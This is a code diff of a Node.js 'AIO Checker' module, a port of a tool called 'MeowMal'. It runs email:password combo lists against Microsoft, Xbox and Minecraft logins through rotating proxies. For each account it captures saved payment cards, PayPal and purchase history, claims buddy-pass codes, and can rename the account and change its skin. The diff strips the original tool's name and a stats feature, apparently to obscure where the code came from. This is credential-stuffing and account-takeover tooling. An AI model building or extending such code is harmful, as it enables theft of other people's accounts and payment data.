@@ -1,7 +1,7 @@
 // ============================================================
-//  MeowMal AIO Checker — 1:1 port of meow.py to Node.js
-//  Self-contained module: own proxy pool, own login, own logic.
-//  No modifications to original logic — exact copy+paste+integrate.
+//  AIO Checker — Microsoft / Xbox / Minecraft account checker
+//  Self-contained: own proxy pool, own login flow, own logic.
+//  Strict 1:1 parity with the upstream auth/payload formats.
 // ============================================================
 
 const fs = require("fs");
@@ -21,7 +21,7 @@ try {
 }
 const MINECRAFT_AVAILABLE = !!mc;
 
-const log = logger.child("meowmal-aio");
+const log = logger.child("aio-checker");
 
 // ── Globals (per-run state, reset each run) ──────────────────
 
@@ -92,7 +92,7 @@ function resetResults() {
   results_codes = [];
 }
 
-// ── Config (hardcoded defaults matching meow.py config.ini) ──
+// ── Config (hardcoded defaults) ──────────────────────────────
 
 const config = {
   timeout: 15,
@@ -129,15 +129,13 @@ const config = {
   setname: false,
   setskin: false,
   save_bad: true,
-  donut_stats: true,
-  donut_api_key: "",
   check_credit_cards: true,
   check_paypal: true,
   check_purchase_history: true,
   optimize_network: true,
 };
 
-// ── Regex patterns (exact from meow.py) ──────────────────────
+// ── Regex patterns ───────────────────────────────────────────
 
 const RE_SFTTAG_VALUE = /value=\\"(.+?)\\"|value="(.+?)"|sFTTag:'(.+?)'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"/s;
 const RE_URLPOST_VALUE = /"urlPost":"(.+?)"|urlPost:'(.+?)'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"/s;
@@ -295,7 +293,7 @@ function markProxySuccess(proxyStr) {
   }
 }
 
-// ── Cookie Jar (1:1 from meow.py CookieSession approach) ────
+// ── Cookie Jar ───────────────────────────────────────────────
 
 class CookieJar {
   constructor() {
@@ -382,7 +380,7 @@ async function sessionFetch(url, options, jar, timeoutMs = 15000) {
   return { text: lastText, finalUrl: currentUrl, status: lastStatus, jar };
 }
 
-// ── lr_parse (exact from meow.py) ────────────────────────────
+// ── lr_parse helper ──────────────────────────────────────────
 
 function lrParse(source, startDelim, endDelim, createEmpty = true) {
   const escaped = startDelim.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
@@ -395,7 +393,7 @@ function lrParse(source, startDelim, endDelim, createEmpty = true) {
   return createEmpty ? "" : null;
 }
 
-// ── format_number (exact from meow.py) ───────────────────────
+// ── format_number ────────────────────────────────────────────
 
 const FORMAT_THRESHOLDS = [
   [1000000000, "B", 2],
@@ -426,7 +424,7 @@ function formatCoins(num) {
   return String(Math.floor(num));
 }
 
-// ── clean_name (exact from meow.py) ──────────────────────────
+// ── clean_name ───────────────────────────────────────────────
 
 const DECORATIVE_RE = /[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+/g;
 
@@ -435,7 +433,7 @@ function cleanName(name) {
   return String(name).replace(DECORATIVE_RE, "").trim();
 }
 
-// ── fetch_meowapi_stats (exact from meow.py) ─────────────────
+// ── Hypixel/Skyblock stats lookup ────────────────────────────
 
 async function fetchMeowApiStats(username, uuid) {
   try {
@@ -552,7 +550,7 @@ async function fetchMeowApiStats(username, uuid) {
   }
 }
 
-// ── MicrosoftChecker class (exact from meow.py) ─────────────
+// ── MicrosoftChecker class ───────────────────────────────────
 
 class MicrosoftChecker {
   constructor(jar, email, password) {
@@ -891,7 +889,7 @@ class MicrosoftChecker {
   }
 }
 
-// ── check_microsoft_account (exact from meow.py) ────────────
+// ── check_microsoft_account ──────────────────────────────────
 
 async function checkMicrosoftAccount(jar, email, password) {
   try {
@@ -960,7 +958,7 @@ async function checkMicrosoftAccount(jar, email, password) {
   }
 }
 
-// ── checkownership (exact from meow.py) ──────────────────────
+// ── checkownership ───────────────────────────────────────────
 
 function checkOwnership(entitlementsResponse) {
   const items = entitlementsResponse.items || [];
@@ -986,7 +984,7 @@ function checkOwnership(entitlementsResponse) {
   return null;
 }
 
-// ── pre_check_combo (exact from meow.py) ─────────────────────
+// ── pre_check_combo ──────────────────────────────────────────
 
 async function preCheckCombo(email, password) {
   const url = "https://login.live.com/ppsecure/post.srf";
@@ -1095,7 +1093,7 @@ async function preCheckCombo(email, password) {
   return "ERROR";
 }
 
-// ── get_urlPost_sFTTag (exact from meow.py) ──────────────────
+// ── get_urlPost_sFTTag ───────────────────────────────────────
 
 async function getUrlPostSFTTag(jar) {
   let attempts = 0;
@@ -1135,7 +1133,7 @@ async function getUrlPostSFTTag(jar) {
   return { urlPost: null, sFTTag: null };
 }
 
-// ── get_xbox_rps (exact from meow.py) ────────────────────────
+// ── get_xbox_rps ─────────────────────────────────────────────
 
 async function getXboxRps(jar, email, password, urlPost, sFTTag) {
   let tries = 0;
@@ -1219,7 +1217,7 @@ async function getXboxRps(jar, email, password, urlPost, sFTTag) {
   return "None";
 }
 
-// ── mc_token (exact from meow.py) ────────────────────────────
+// ── mc_token ─────────────────────────────────────────────────
 
 async function getMcToken(jar, uhs, xstsToken) {
   let attempts = 0;
@@ -1246,7 +1244,7 @@ async function getMcToken(jar, uhs, xstsToken) {
   return null;
 }
 
-// ── payment (exact from meow.py) ─────────────────────────────
+// ── payment extraction ───────────────────────────────────────
 
 async function extractPayment(jar, email, password) {
   let attempts = 0;
@@ -1358,7 +1356,7 @@ async function extractPayment(jar, email, password) {
   return null;
 }
 
-// ── claim_buddypass_offers (exact from meow.py) ──────────────
+// ── claim_buddypass_offers ───────────────────────────────────
 
 async function claimBuddypassOffers(jar, xboxToken) {
   const codes = [];
@@ -1460,7 +1458,7 @@ async function claimBuddypassOffers(jar, xboxToken) {
   } catch {}
 }
 
-// ── Hypixel check (from Capture.hypixel in meow.py) ─────────
+// ── Hypixel check ────────────────────────────────────────────
 
 async function hypixelCheck(name, jar) {
   const result = { hypixl: null, level: null, firstlogin: null, lastlogin: null, bwstars: null };
@@ -1516,7 +1514,7 @@ async function hypixelCheck(name, jar) {
   return result;
 }
 
-// ── Optifine check (from Capture.optifine in meow.py) ────────
+// ── Optifine check ───────────────────────────────────────────
 
 async function optifineCheck(name) {
   if (!config.optifinecape || !config.optifine_cape) return "Unknown";
@@ -1630,7 +1628,7 @@ async function namechangeCheck(token) {
   return result;
 }
 
-// ── Capture builder (from Capture.builder in meow.py) ────────
+// ── Capture builder ──────────────────────────────────────────
 
 function buildCaptureLine(c) {
   let banStatus;
@@ -1673,9 +1671,7 @@ function buildCaptureLine(c) {
   return line;
 }
 
-// ── Hypixel Ban Check (1:1 port of Capture.ban from meow.py) ──
-
-const DONUT_API_URL = "https://api.donutsmp.net/v1/stats/";
+// ── Hypixel Ban Check ────────────────────────────────────────
 
 let banproxies = [];
 
@@ -1815,98 +1811,11 @@ async function checkBan(name, uuid, token) {
   return banned;
 }
 
-// ── Donut SMP Stats (1:1 port from meow.py) ──────────────────
-
-function formatSeconds(totalSec) {
-  try {
-    let s = parseInt(totalSec);
-    if (s < 0) s = 0;
-    const days = Math.floor(s / 86400); s %= 86400;
-    const hours = Math.floor(s / 3600); s %= 3600;
-    const minutes = Math.floor(s / 60);
-    const secs = s % 60;
-    const parts = [];
-    if (days) parts.push(`${days}d`);
-    if (hours) parts.push(`${hours}h`);
-    if (minutes) parts.push(`${minutes}m`);
-    if (!parts.length) parts.push(`${secs}s`);
-    return parts.join(" ");
-  } catch { return String(totalSec); }
-}
-
-async function checkDonutSmp(name) {
-  if (!config.donut_stats || !name || name === "N/A") return null;
-
-  const headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    Accept: "application/json",
-  };
-  if (config.donut_api_key) headers.Authorization = `Bearer ${config.donut_api_key}`;
-
-  let response = null;
-  const proxyCandidates = [];
-  if (!isNoProxy()) {
-    for (let i = 0; i < 4; i++) {
-      const p = getProxy();
-      if (p) proxyCandidates.push(p);
-    }
-  }
-  proxyCandidates.push(null);
-  const unique = [];
-  const seen = new Set();
-  for (const p of proxyCandidates) {
-    const k = JSON.stringify(p);
-    if (!seen.has(k)) { seen.add(k); unique.push(p); }
-  }
-
-  for (let idx = 0; idx < unique.length; idx++) {
-    try {
-      const opts = { headers, signal: AbortSignal.timeout(20000) };
-      const p = unique[idx];
-      if (p) opts.agent = makeAgent(p);
-      const r = await fetch(`${DONUT_API_URL}${name}`, opts);
-      await sleep(300 * (idx + 1));
-      if (r.status === 200 || [401, 404, 429].includes(r.status)) {
-        response = r;
-        break;
-      }
-    } catch { continue; }
-  }
-
-  if (!response || response.status !== 200) return null;
-
-  try {
-    const data = await response.json();
-    let statsData = null;
-    if (data && typeof data === "object") {
-      if (data.result && typeof data.result === "object") statsData = data.result;
-    }
-    if (!statsData) return null;
-
-    const lines = [];
-    if (statsData.broken_blocks) lines.push(`broken_blocks: ${statsData.broken_blocks}`);
-    if (statsData.deaths) lines.push(`deaths: ${statsData.deaths}`);
-    if (statsData.kills) lines.push(`kills: ${statsData.kills}`);
-    if (statsData.mobs_killed) lines.push(`mobs_killed: ${statsData.mobs_killed}`);
-    if (statsData.money) lines.push(`money: ${statsData.money}`);
-    if (statsData.money_made_from_sell) lines.push(`money_made_from_sell: ${statsData.money_made_from_sell}`);
-    if (statsData.money_spent_on_shop) lines.push(`money_spent_on_shop: ${statsData.money_spent_on_shop}`);
-    if (statsData.placed_blocks) lines.push(`placed_blocks: ${statsData.placed_blocks}`);
-    if (statsData.playtime) {
-      try {
-        const fmt = formatSeconds(statsData.playtime);
-        lines.push(`playtime: ${statsData.playtime} (${fmt})`);
-      } catch { lines.push(`playtime: ${statsData.playtime}`); }
-    }
-    return { lines, raw: statsData };
-  } catch { return null; }
-}
-
-// ── Set Name (1:1 port from meow.py Capture.setname) ─────────
+// ── Set Name ─────────────────────────────────────────────────
 
 async function setMcName(token, currentName) {
   if (!config.setname) return null;
-  const nameFormat = config.name || "MeowMal";
+  const nameFormat = config.name || "Player";
   let newname = nameFormat;
   while (newname.includes("{random_letter}"))
     newname = newname.replace("{random_letter}", String.fromCharCode(97 + Math.floor(Math.random() * 26)));
@@ -1937,7 +1846,7 @@ async function setMcName(token, currentName) {
   return null;
 }
 
-// ── Set Skin (1:1 port from meow.py Capture.setskin) ─────────
+// ── Set Skin ─────────────────────────────────────────────────
 
 async function setMcSkin(token) {
   if (!config.setskin) return false;
@@ -2020,14 +1929,6 @@ async function handleCapture(email, password, name, capes, uuid, token, type, ja
       }
     } catch { stats.errors++; }
 
-    // Donut SMP stats
-    try {
-      const donut = await checkDonutSmp(name);
-      if (donut && donut.lines && donut.lines.length) {
-        c.donut = donut;
-      }
-    } catch { stats.errors++; }
-
     // Set Name
     try {
       const nameResult = await setMcName(token, name);
@@ -2082,7 +1983,7 @@ async function handleCapture(email, password, name, capes, uuid, token, type, ja
   return c;
 }
 
-// ── checkmc (exact from meow.py) ─────────────────────────────
+// ── checkmc — Minecraft entitlement & capture flow ──────────
 
 async function checkMc(jar, email, password, token, xboxToken) {
   let acctype = null;
@@ -2131,7 +2032,7 @@ async function checkMc(jar, email, password, token, xboxToken) {
 
   const capesStr = capesList.join(", ");
 
-  // Handle capture (only if NOT Game Pass only — exact from meow.py)
+  // Handle capture (only if NOT Game Pass only)
   if (!acctype.includes("Game Pass") || acctype.includes("Normal")) {
     try {
       await handleCapture(email, password, name, capesStr, uuidStr, token, acctype, jar);
@@ -2165,7 +2066,7 @@ async function checkMc(jar, email, password, token, xboxToken) {
   return true;
 }
 
-// ── authenticate (exact from meow.py) ────────────────────────
+// ── authenticate — primary login + Xbox/MC pipeline ─────────
 
 async function authenticate(email, password) {
   let currentTry = 0;
@@ -2227,7 +2128,7 @@ async function authenticate(email, password) {
         }
       } catch {}
 
-      // Payment extraction (exact from meow.py)
+      // Payment extraction
       if (config.payment) {
         try {
           await extractPayment(jar, email, password);
@@ -2267,7 +2168,7 @@ async function authenticate(email, password) {
   return false;
 }
 
-// ── Checker (exact from meow.py — wraps pre_check + authenticate) ──
+// ── Checker — wraps pre_check + authenticate ────────────────
 
 async function Checker(combo) {
   try {
@@ -2350,7 +2251,7 @@ async function runAioCheck(combos, threads = 30, onProgress, signal) {
     concurrency: threads,
     maxRetries: 0,
     signal,
-    scope: "meowmal-aio",
+    scope: "aio-checker",
     runner: async (combo) => {
       if (signal?.aborted) return { status: "skipped", email: combo.split(":")[0] };
       return await Checker(combo);
